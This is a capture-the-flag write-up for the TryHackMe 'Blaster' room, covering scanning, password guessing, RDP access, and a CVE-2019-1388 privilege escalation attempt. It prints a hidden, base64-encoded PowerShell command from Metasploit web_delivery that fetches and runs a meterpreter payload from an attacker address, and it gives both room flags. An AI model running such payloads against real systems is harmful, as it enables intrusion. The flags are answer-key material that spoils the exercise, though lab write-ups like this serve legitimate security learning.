---
title: "Blaster"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src ="blaster.jpeg" alt="blaster" width=200/>

## Enumeration

### nmap
```
PORT     STATE SERVICE            REASON  VERSION
80/tcp   open  http               syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0

3389/tcp open  ssl/ms-wbt-server? syn-ack
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2021-11-25T11:34:32+00:00
|_ssl-date: 2021-11-25T11:34:40+00:00; +2m29s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Issuer: commonName=RetroWeb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-24T11:29:28
| Not valid after:  2022-05-26T11:29:28
| MD5:   0151 0047 a3fc c5ce 222d 5b1c 06c4 22ca
| SHA-1: bbe0 b822 09c4 19d6 f833 d955 ea5c 77b2 06a1 7655
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQT11vH87CQaZJ1GVx/+HWPTANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMTExMjQxMTI5MjhaFw0yMjA1MjYxMTI5
| MjhaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAs5imJsXtygtq3EAJStpMJMHJKHYninyGcaoS8QGtzrcPCnL8o2Eh
| ukCUsIBQKbFymcXT+TEeLU+q9+R8xrmX+8fVwckX3XA2seKOa4CQkYolEBtZ3kq5
| bbR1Jzirf3KpwoO5el/TYlxFDvGJMKsDUZYftAfhkaTCS0L2tLbARHCHHmX9SKxH
| D0G7CiBW708w3gAnqkSLLfD+n1DXig6vP1hOQz3k/+zWl9iHoKkl/TLl3umD1J0q
| C5ympfGavD4dFwANWVf0ISmOZj4W3eYCWnaul6l3GQlKJN8cpIB0PRxwvpyfabn6
| JBPuWtosjHAD9U9DTQ/HqzzkRCtWUIGlBwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHY6p9ZxWpMU
| Stj2A8gJpTchEWzSYaHhP62BNOxLrNUSN/NKbHVewgF5QmxWDLr6wb+DtT7Q9JmR
| AhG72MzKkYf4BMuUbu37xkpxhlXDaQCYDpf8GzoTp9KnHy2w1CwYwaZ93lqzJqkt
| B6i6IqNbolEZYi52gksnCAymGOtjXWtwwPK3HTYYXGWH5ImmUkoNEKJxQuVQdeMI
| zWtXKhSkNwcfE7ct8ZmpPF9HX0ELRfAFNP2WQPl9R+CZHQWrH9R1Z7B5sb4gEBKL
| KGBsZwID6qVW1cXW5Mq9jjHwK8UcBzI+7Wq72IzUf0Rge+Vwxo/lqJeog+mlgR4P
| vhHE6Qv+uW8=
|_-----END CERTIFICATE-----
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m29s, deviation: 0s, median: 2m28s

```

### ffuf (using big.txt)

```
retro                   [Status: 301, Size: 150, Words: 9, Lines: 2]
```

As a big fan of videogames and a retro games enjoyer this page was just amazing

the user `wade` seem to be a very cool guy

```
I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 
```
google "wade book character" if you don't know about `Ready player one`

yeah they actually made a movie of that

anyway we are looking for Wade Owen Watts avatar (OaSiS) name as password

its `parzival`


We RDP with those and read user.txt

THM{ready_player_one}

## Privilege Escalation

ugh...internet explorer

For this part I tried many times to check the browser's history but could only see today's history wich was not useful

I went to ask for help and got 

[cve-2019-1388](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388)

And according to the summary 

```
To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system.
```

When trying to run `hhupd.exe` we get admin password prompt

click on `show more details` then `show information about the publisher's certificate`

click the `versign` link after 'Issued by:'

Again I had issues making this part work...

Got a 404 error on the link where it was supposed to serve a page 

We normally save it as `C:\Windows\System32\*.*` (filename)

And run cmd as `nt authority\system`...

I could not do this so I went directly to the metasploit method

hoping this would work...

We use `exploit/multi/script/web_delivery`

```
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH
   3   Regsvr32
   4   pubprn
   5   SyncAppvPublishingServer
   6   PSH (Binary)
   7   Linux
   8   Mac OS X


msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
```

we set the payload to `windows/meterpreter/reverse_http`

then we run as a job with `run -j`

we get this
```
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAGwAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAaQBsAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAaQBsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIAMgA2AC4AMgAwADMAOgA4ADAAOAAwAC8AMwA2AHUAMwBuAEEASgBmAG8ASQBRADYATwB1AEkALwBrADcAQQA0AGYAVwBmAHEAOQBxAGgAMwBQAFMATAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIAMgA2AC4AMgAwADMAOgA4ADAAOAAwAC8AMwA2AHUAMwBuAEEASgBmAG8ASQBRADYATwB1AEkAJwApACkAOwA=
```

I pasted it in a cmd console...it crashed :-(

anyway `run persistence -X` was supposed to give us a backdoor

well..according to reddit and other not-so-trustable sources there is an issue
with this room

And tryhackme seems to be aware, here is from [known issues](https://help.tryhackme.com/miscellaneous/known-issues-with-rooms)


```
Blaster

Issue: No web-browser history for the CVE.

Current workaround: The original room for this - Retro - has the CVE as expected.

Expected timeline of resolution: Indefinite.
```
ah yes here is the root flag (real flag no jokes XD) if that matter to you

`THM{COIN_OPERATED_EXPLOITATION}`

As long as issues are not fixed you might as well have this one for free

Anyway this was a fun trial...hope this is fixed soon

I strongly recommand trying `retro` room later as its similar to this one but HARDER

I will do it when I am ready...(kek)
